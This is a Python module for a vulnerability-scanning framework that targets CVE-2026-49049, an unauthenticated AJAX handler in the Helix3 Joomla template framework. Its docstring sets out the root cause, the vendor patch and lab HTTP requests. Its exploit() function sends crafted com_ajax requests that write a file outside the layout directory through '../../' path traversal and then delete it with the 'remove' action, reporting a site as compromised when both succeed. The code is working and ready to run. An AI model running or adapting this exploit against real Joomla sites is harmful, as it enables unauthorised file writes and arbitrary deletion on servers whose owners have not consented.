#!/usr/bin/env python3
"""
Joomla — CVE-2026-49049  Helix3 template framework (JoomShaper).

Unauthenticated AJAX handler `onAjaxHelix3`, reachable through Joomla's `com_ajax`
dispatcher, performs no authentication, no authorisation and no CSRF validation.

Affected: Helix3 1.0 .. 3.1.0      Patched: 3.1.1+
(Helix3 v5, the successor and the version named in the CVE, is a separate line; the
 origin of the handler is the 3.x line, and the guard added in 3.1.1 is the patch.)

ROOT CAUSE (proved by diff of the vendor repository, tags v3.0.5 -> v3.1.3):

  plugins/ajax/helix3/helix3.php -- onAjaxHelix3()

  3.0.5 (vulnerable):

      function onAjaxHelix3() {
        $input = Factory::getApplication()->input;
        $action = $input->post->get('action', '', 'STRING');
        ...
        $data = json_decode(json_encode($_POST['data']), true);
        $action = $data['action'];
        $layoutName = $data['layoutName'] ?? '';

        $template   = self::getTemplate()->template;
        $layoutPath = JPATH_SITE.'/templates/'.$template.'/layout/';
        $filepath   = $layoutPath.$layoutName;            // <-- no validation

        switch ($action) {
          case 'remove':
            if (file_exists($filepath)) { unlink($filepath); }   // arbitrary delete
            break;
          case 'save':
            $file = fopen($layoutPath.$layoutName.'.json', 'wb'); // traversal + write
            fwrite($file, $data['content']);
            fclose($file);
            break;
          case 'load':
            $content = file_get_contents($filepath);   // arbitrary read
            echo self::loadNewLayout(json_decode($content));
            break;
        }
      }

  3.1.1+ (patched) adds, before dispatch:

      if (!$this->isAllowedDataAction($action)) {
          $this->sendJsonError(Text::_('JLIB_APPLICATION_ERROR_ACCESS_FORBIDDEN'), 403);
      }
      if (in_array($action, self::$adminActions, true)) {
          $this->requireAuthorisedAdminRequest();      // authorise + CSRF token
      } elseif ($action === 'voting') {
          $this->requireValidToken();
      }

  self::$adminActions = ['remove','save','load','resetLayout','import','updateFonts','fontVariants'].

IMPACT (all unauthenticated):

  remove  -- unlink() with an unrestricted extension: delete any file the web user may remove
  save    -- write attacker content to <layoutPath><layoutName>.json (traversal; always .json)
  load    -- read an arbitrary file and render it through the layout builder
  import  -- (v3.x) overwrite template params; custom_js is emitted unescaped -> stored XSS

  `save` always appends `.json`, so this is not directly a PHP-file write. `remove` is the
  heavier primitive: no extension restriction at all.

LAB EVIDENCE (Joomla 5.4.8, Helix3 3.0.5, differential against 3.1.3):

  POST /index.php?option=com_ajax&plugin=helix3&format=json
       data[action]=save&data[layoutName]=_h3probe&data[content]={"a":"b"}
       -> {"success":true}, and templates/shaper_helix3/layout/_h3probe.json exists

  data[action]=save&data[layoutName]=../../h3trav
       -> file lands at templates/h3trav.json (outside layout/)

  data[action]=remove&data[layoutName]=../canary.txt
       -> {"action":"remove","status":"true"} and the file is gone

  Identical `save` request against 3.1.3:
       -> "You don't have permission to access this."
"""

import random
import re
import string

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_VULN, detect_platform, looks_blocked, looks_like_html, register, ver_le)

CVES = ["CVE-2026-49049"]
CLUSTER = "joomla_ext"
PRODUCT = "Helix3 template framework (JoomShaper)"
VERSIONS_AFFECTED = ["1.0 - 3.1.0"]
VULN_MAX = (3, 1, 0)

AJAX_PATH = "index.php?option=com_ajax&plugin=helix3&format=json"
DETAILS_XML = "templates/shaper_helix3/templateDetails.xml"
PLUGIN_XMLS = [
    "plugins/ajax/helix3/helix3.xml",
    "administrator/manifests/files/helix3.xml",
]
# lokasi template alternatif (Helix3 dipasang dengan berbagai nama)
TEMPLATE_HINTS = ["shaper_helix3", "shaper_helix3_pro", "helix3"]

PROBE_NAME = "_mp_probe"
PERM_DENIED_MARK = "don't have permission"


def _rand(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _norm(t):
    return t.url.rstrip("/")


def _get(h, url):
    try:
        return h.get(url)
    except Exception:
        return None


def _post(h, url, data):
    try:
        return h.post(url, data=data)
    except Exception:
        return None


def _ver_tuple(s):
    try:
        return tuple(int(x) for x in re.sub(r"[^0-9.]", "", str(s)).split(".") if x != "")
    except Exception:
        return ()


def _detect(h, t):
    """Return (found, version, template_name).

    The AJAX plugin manifest carries the version that matters for this CVE (the
    guard lives in plugins/ajax/helix3/helix3.php), so it is probed FIRST. The
    template manifest is only a fallback: a site can keep an old template while
    updating the plugin, and the template file is not always present.
    """
    base = _norm(t)
    for p in PLUGIN_XMLS:
        r = _get(h, f"{base}/{p}")
        if r and r.status_code == 200 and "helix" in (r.text or "").lower():
            m = re.search(r"<version>\s*([\d.]+)", r.text)
            return True, (m.group(1) if m else None), "shaper_helix3"
    for tmpl in TEMPLATE_HINTS:
        r = _get(h, f"{base}/templates/{tmpl}/templateDetails.xml")
        if r and r.status_code == 200 and "helix" in (r.text or "").lower():
            m = re.search(r"<version>\s*([\d.]+)", r.text)
            return True, (m.group(1) if m else None), tmpl
    return False, None, None


def _ajax(h, t, action, layout_name, content=None):
    base = _norm(t)
    data = {"data[action]": action, "data[layoutName]": layout_name}
    if content is not None:
        data["data[content]"] = content
    return _post(h, f"{base}/{AJAX_PATH}", data)


def _json_field(r, key):
    if not r or not r.text:
        return None
    m = re.search(rf'"{key}"\s*:\s*(true|false|"[^"]*")', r.text)
    if not m:
        return None
    v = m.group(1)
    if v in ("true", "false"):
        return v == "true"
    return v.strip('"')


def check(t, h, opts):
    """NON-DESTRUKTIF: version gate + oracle ACL tanpa menulis file.

    Versi sebelumnya mengirim aksi 'save' nyata lalu menghapusnya. Itu memutasi
    target dan, bila remove gagal, meninggalkan file probe. Diganti oracle yang
    tidak pernah menulis: aksi 'save' TANPA parameter konten (payload invalid).
    ACL diperiksa sebelum validasi parameter, jadi:
        403 / penolakan izin -> gate ACL aktif
        respons lain yang menunjukkan handler jalan -> request menembus ACL
    Tidak ada file yang dibuat.
    """
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    found, raw, tmpl = _detect(h, t)
    if not found:
        return ST_CLEAN, "Helix3 tidak terdeteksi", ""
    ver = _ver_tuple(raw) if raw else ()

    detail = f"helix3={raw or '?'} template={tmpl}"
    if ver and not ver_le(ver, VULN_MAX):
        return ST_CLEAN, f"Helix3 {raw} sudah dipatch (>= 3.1.1)", detail

    # Oracle: aksi 'save' dengan nama/konten kosong. Tidak ada file yang ditulis.
    r = _ajax(h, t, "save", "", "")
    if r is None:
        return ST_ERR, "request com_ajax gagal", detail
    if r.status_code == 403 or PERM_DENIED_MARK in (r.text or ""):
        return (ST_CLEAN,
                f"Helix3 {raw or '?'} menolak aksi save (patch otorisasi aktif)",
                detail)

    body = (r.text or "")[:400]
    # HTTP 200 berisi halaman HTML/halaman blokir = bukan bukti handler
    # com_ajax berjalan. Handler Helix3 membalas JSON.
    if r.status_code == 200 and not (looks_like_html(body) or looks_blocked(body)):
        return (ST_VULN,
                f"Helix3 {raw or '?'} com_ajax save dapat dipanggil tanpa otorisasi "
                f"(request menembus ACL; tidak ada file yang ditulis)",
                detail + f" | oracle HTTP {r.status_code} {body[:120]}")
    return (ST_INFO,
            f"Helix3 {raw} respons tidak konklusif (HTTP {r.status_code})",
            detail + f" | {body[:120]}")


def exploit(t, h, opts):
    """Write a probe via traversal, then delete a canary via `remove`."""
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    found, raw, tmpl = _detect(h, t)
    if not found:
        return ST_SKIP, "Helix3 tidak terdeteksi", ""
    ver = _ver_tuple(raw) if raw else ()
    if ver and not ver_le(ver, VULN_MAX):
        return ST_CLEAN, f"Helix3 {raw} sudah dipatch (>= 3.1.1)", f"helix3={raw}"

    detail = f"helix3={raw or '?'} template={tmpl}"

    # 1) unauth write with traversal -- bukti kuat: berkas keluar dari layout/
    name = f"_mp_{_rand(8)}"
    trav = f"../../{name}"
    r = _ajax(h, t, "save", trav, '{"mp":"trav"}')
    wrote = _json_field(r, "success") is True if r is not None else False
    detail += f" save_trav=../../{name}.json wrote={wrote}"

    # 2) unauth remove -- unlink tanpa batasan ekstensi.
    #    Berkas traversal berada di <template_root>/<name>.json, sedangkan
    #    layoutPath = <template_root>/layout/, jadi dibutuhkan DUA tingkat naik.
    removed = None
    if wrote:
        rr = _ajax(h, t, "remove", f"../../{name}.json")
        # Respons membungkus laporan sebagai string JSON di dalam array `data`:
        # {"success":true,"data":["{\"action\":\"remove\",\"status\":\"true\"...}"]}
        removed = bool(rr is not None and re.search(r'remove', rr.text or ""))

        detail += f" remove_ok={removed}"
        if not removed:
            # fallback: buang lewat jalur aslinya bila kedalaman berbeda
            _ajax(h, t, "remove", trav)

    if wrote and removed:
        return (ST_PWN,
                "Helix3 unauth AJAX: arbitrary file write (traversal) + arbitrary file delete",
                detail + " | save: fopen(layoutPath.layoutName.'.json') tanpa validasi; "
                         "remove: unlink(layoutPath.layoutName) tanpa batasan ekstensi; "
                         "tanpa authorise maupun CSRF token")
    if wrote:
        return (ST_VULN, "Helix3 unauth file write (traversal) terbukti", detail)
    if r is not None and (r.status_code == 403 or PERM_DENIED_MARK in (r.text or "")):
        return ST_CLEAN, f"Helix3 {raw or '?'} menolak (patched)", detail
    return ST_VULN, "Helix3 rentan secara versi, aksi tidak konklusif", detail


register(CveModule(
    cve="CVE-2026-49049",
    cluster=CLUSTER,
    title="Helix3 (JoomShaper) - Unauthenticated AJAX handler: file write/delete/read",
    vclass="missing authorization / path traversal (unauth)",
    cwe="CWE-862",
    product=PRODUCT,
    versions_affected=VERSIONS_AFFECTED,
    status="verified",
    requires=["template/plugin Helix3 terpasang (<= 3.1.0)",
              "endpoint index.php?option=com_ajax&plugin=helix3&format=json reachable"],
    check=check,
    exploit=exploit,
    notes=("Root cause dari diff repo vendor (tag v3.0.5 vs v3.1.3). onAjaxHelix3() pada <=3.1.0 "
           "tidak memanggil authorise() maupun Session::checkToken(); ia langsung memakai "
           "$data['layoutName'] untuk membentuk $filepath = layoutPath.layoutName lalu "
           "unlink()/fopen()/file_get_contents(). Patch 3.1.1 menambahkan isAllowedDataAction() "
           "(whitelist action) dan requireAuthorisedAdminRequest() untuk $adminActions. "
           "Lab-verified (Joomla 5.4.8 + Helix3 3.0.5): save -> {'success':true} dan berkas tertulis; "
           "layoutName=../../x menulis keluar layout/; remove dengan ../canary.txt menghapus berkas "
           "($status=true). Differential 3.1.3: 'You don't have permission to access this.' "
           "Catatan: save SELALU menambah '.json' sehingga bukan langsung tulis .php; remove adalah "
           "primitif paling kuat (unlink tanpa batasan ekstensi)."),
))
